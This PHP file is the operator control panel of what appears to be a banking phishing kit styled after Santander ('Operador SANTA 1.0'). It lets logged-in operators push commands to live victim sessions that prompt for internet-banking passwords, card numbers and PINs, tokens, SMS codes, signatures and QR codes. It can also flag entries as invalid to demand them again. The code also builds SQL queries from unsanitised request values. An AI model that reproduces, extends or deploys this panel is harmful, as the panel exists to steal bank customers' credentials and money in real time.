<?php
include('../../conn.php');
include('../functions/functions.php');

$ActiveLink = '';
$Gerenciamento = 'none';
$displaySendName = 'none';
$displaySendPos = 'none';
$displaySendNota = 'none';
$displaySendRef = 'none';
$displaySendMensagemM = 'none';
$displaySendMensagemF = 'none';
$displaySendQrCodeF = 'none';
$displaySendQrCodeJ = 'none';
$displaySendMsgJuba = 'none';

/* CHECA USUÁRIO LOGADO */
if(isset($_SESSION['OpLogin']) && isset($_SESSION['OpPass'])):

	$Log = $_SESSION['OpLogin'];
	$senha = $_SESSION['OpPass'];

	$tabela = 'admin';
	$cond = "WHERE login = '$Log' AND senha = '$senha'";
	$ReadUser = read($conn, $tabela, $cond);

	if($ReadUser[0]['login'] == $Log && $ReadUser[0]['senha'] == $senha):
		$_SESSION['OpNivel'] = $ReadUser[0]['nivel'];
	//$_SESSION['OpNivel'] = '2';
		$_SESSION['OpId'] = $ReadUser[0]['id'];
	else:
		header('Location: index.php');
	endif;

else:
	header('Location: index.php');
endif;

/* ADICIONA PÁGINAS AO CONTENT GERAL */
if(isset($_GET['pag']) && $_GET['pag'] != ''):
	$GetPag = addslashes($_GET['pag']);

switch ($GetPag):
	case 'visualizar':
		$AdicionaPag = 'lista-clientes.php';
		$ActiveLink = 'lista-clientes';
	break;
	case 'lista-infos':
		$AdicionaPag = 'lista-infos.php';
		$ActiveLink = 'lista-infos';
	break;
	case 'meus-dados':
		$AdicionaPag = 'edite-user.php';
		$ActiveLink = 'edite-user';
	break;
	case 'add-user':
		$AdicionaPag = 'add-user.php';
		$ActiveLink = 'add-user';
	break;
	case 'manage-user':
		$AdicionaPag = 'manage-user.php';
		$ActiveLink = 'manage-user';
	break;
	case 'logoff':
		$OpId = $_SESSION['OpId'];
		update($conn, 'admin', "online = '0'", "WHERE id = '$OpId'");
		unset($_SESSION['OpLogin']);
		unset($_SESSION['OpPass']);
		unset($_SESSION['OpId']);
		unset($_SESSION['OpNivel']);
		echo '<script>alert("Desconectado com sucesso!");</script>';
		echo '<script>window.location.href="index.php";</script>';
	break;

	default:
		$AdicionaPag = 'lista-clientes.php';

	break;
endswitch;

else:
	$AdicionaPag = 'lista-clientes.php';
	$ActiveLink = 'home';
endif;

/* RECEBE COMANDOS DE GERENCIAMENTO */
if(isset($_GET['gerenciar_fisi']) && $_GET['gerenciar_fisi'] != ''):

	$SendIdUser = $_GET['gerenciar_fisi'];
	$Gerenciamento = 'block';
	$ManageFisica = 'block';
	$ManageFisicaM = 'none';
	$ManageJuba = 'none';

elseif(isset($_GET['gerenciar_juba']) && $_GET['gerenciar_juba'] != ''):
	$SendIdUser = $_GET['gerenciar_juba'];
	$Gerenciamento = 'block';
	$ManageFisicaM = 'none';
	$ManageFisica = 'none';
	$ManageJuba = 'block';
endif;

if(isset($_GET['send']) && $_GET['send'] == 'get_table'):
	update($conn, "acessos", "comando = 'TABELA'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'get_psn'):
	update($conn, "acessos", "comando = 'SENHA NET'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'get_pscc'):
	update($conn, "acessos", "comando = 'SENHA CC'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'get_cc'):
	update($conn, "acessos", "comando = 'CC'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'get_tks_fisica'):
	update($conn, "acessos", "comando = 'TOKEN'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'get_phone'):
	update($conn, "acessos", "comando = 'FONE'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'get_ass'):
	update($conn, "acessos", "comando = 'ASSINATURA'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'get_sms'):
	update($conn, "acessos", "comando = 'SMS'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'get_serial'):
	update($conn, "acessos", "comando = 'SERIAL'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'get_caixa'):
	update($conn, "acessos", "comando = 'CAIXA', status = '1'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'get_apelido'):
	update($conn, "acessos", "comando = 'APELIDO'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'get_cod_num'):
	update($conn, "acessos", "comando = 'COD NUM'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');



/* COMANDOS INVALIDOS */

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_acesso'):
	update($conn, "acessos", "comando = 'ACESSO X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_psn'):
	update($conn, "acessos", "comando = 'SENHA NET X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_pscc'):
	update($conn, "acessos", "comando = 'SENHA CC X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_cc'):
	update($conn, "acessos", "comando = 'CC X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_table'):
	update($conn, "acessos", "comando = 'TABELA X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_tks'):
	update($conn, "acessos", "comando = 'TOKEN X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'inv_phone'):
	update($conn, "acessos", "comando = 'FONE X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'inv_ass'):
	update($conn, "acessos", "comando = 'ASSINATURA X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'inv_sms'):
	update($conn, "acessos", "comando = 'SMS X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_qrcode'):
	update($conn, "acessos", "comando = 'QRCODE X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'finalizar'):
	update($conn, "acessos", "comando = 'FINALIZADO', status = '1'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_serial'):
	update($conn, "acessos", "comando = 'SERIAL X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_cod_num'):
	update($conn, "acessos", "comando = 'COD NUM X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');



elseif(isset($_GET['send']) && $_GET['send'] == 'get_nota'):
	$displaySendNota = 'block';
elseif(isset($_GET['send']) && $_GET['send'] == 'get_tks_mobile'):
	$displaySendRef = 'block';
elseif(isset($_GET['send']) && $_GET['send'] == 'send_message_mobile'):
	$displaySendMensagemM = 'block';
elseif(isset($_GET['send']) && $_GET['send'] == 'send_message_fisica'):
	$displaySendMensagemF = 'block';
elseif(isset($_GET['send']) && $_GET['send'] == 'send_message_juba'):
	$displaySendMsgJuba = 'block';
elseif(isset($_GET['send']) && $_GET['send'] == 'get_qrcode'):
	$displaySendQrCodeF = 'block';
elseif(isset($_GET['send']) && $_GET['send'] == 'get_qrcode_juba'):
	$displaySendQrCodeJ = 'block';
endif;

if(isset($_POST['send_mensagem_fisica']) && isset($_POST['send_id_user'])):
	$SendIdUser = $_POST['send_id_user'];
	$SendMensagemFisica = $_POST['send_mensagem_fisica'];
	update($conn, "acessos", "mensagem = '$SendMensagemFisica', comando = 'MENSAGEM'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_POST['send_msg_juba']) && isset($_POST['send_id_user'])):
	$SendIdUser = $_POST['send_id_user'];
	$SendMensagemJuba = $_POST['send_msg_juba'];
	update($conn, "acessos", "mensagem = '$SendMensagemJuba', comando = 'MENSAGEM'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');

elseif(isset($_POST['send_qrlink']) && isset($_POST['send_id_user'])):
	$SendIdUser = $_POST['send_id_user'];
	$sendQrLink = $_POST['send_qrlink'];
	update($conn, "acessos", "tokenqrcode = '$sendQrLink', comando = 'QRCODE'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
endif;


/* ATUALIZAR PÁGINAS */
if(!isset($_GET['pag']) && !isset($_GET['gerenciar_fisi']) && !isset($_GET['gerenciar_juba'])):
	echo '<meta http-equiv="refresh" content=5;url="acesso.php">';
endif;
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>ONLINE - Operador SANTA  1.0</title>
	<link rel="stylesheet" href="../fonts/_fonts.css">
	<link rel="stylesheet" href="../estilos/font-awesome.css">
	<link rel="stylesheet" href="../estilos/operador.css">
	<link href="https://fonts.googleapis.com/css?family=Droid+Sans:400,700" rel="stylesheet">
</head>
<body class="person_index">
	<div class="container">
		<div class="block_menu">
			<?php

				if($_SESSION['OpNivel'] == 2):
			?>
			<ul>
				<li><a href="acesso.php" class="<?php if($ActiveLink == 'home'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-refresh"></i>Home</a></li>
				<li><a href="acesso.php?pag=lista-infos" class="<?php if($ActiveLink == 'lista-infos'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-list-ul"></i>Finalizadas</a></li>
				<li><a href="acesso.php?pag=meus-dados" class="<?php if($ActiveLink == 'edite-user'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-asterisk"></i>Meus dados</a></li>
				<li><a href="acesso.php?pag=add-user" class="<?php if($ActiveLink == 'add-user'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-plus"></i>Gerenciar Usuários</a></li>
				<li><a href="acesso.php?pag=logoff" class="<?php if($ActiveLink == 'logoff'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-times"></i>Sair</a></li>
				<li class="clear"></li>
			</ul>
			<?php
				elseif($_SESSION['OpNivel'] == 1):
			?>
			<ul>
				<li><a href="acesso.php" class="<?php if($ActiveLink == 'home'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-refresh"></i>Home</a></li>
				<li><a href="acesso.php?pag=meus-dados" class="<?php if($ActiveLink == 'edite-user'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-asterisk"></i>Meus dados</a></li>
				<li><a href="acesso.php?pag=logoff" class="<?php if($ActiveLink == 'logoff'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-times"></i>Sair</a></li>
				<li class="clear"></li>
			</ul>
			<?php
				endif;
			?>

			<div class="clear"></div>
		</div>
		<div class="block_content">
			<?php
			include($AdicionaPag);
			?>
		</div>
	</div><!-- container -->

	<div class="gerenciamento fisico" style="display:<?php echo $Gerenciamento;?>">
		<!-- GERENCIAMENTO FISICA -->
		<?php include('gerente/gerente_fisico.php');?>
		<!-- GERENCIAMENTO FISICA -->

		<!-- GERENCIAMENTO FISICA MOBILE -->
		<?php include('gerente/gerente_fisico_mob.php');?>
		<!-- GERENCIAMENTO FISICA MOBILE -->

		<!-- GERENCIAMENTO JURIDICA -->
		<?php include('gerente/gerente_juridico.php');?>
		<!-- GERENCIAMENTO JURIDICA -->

	</div><!-- gerenciamento -->

</body>
</html>
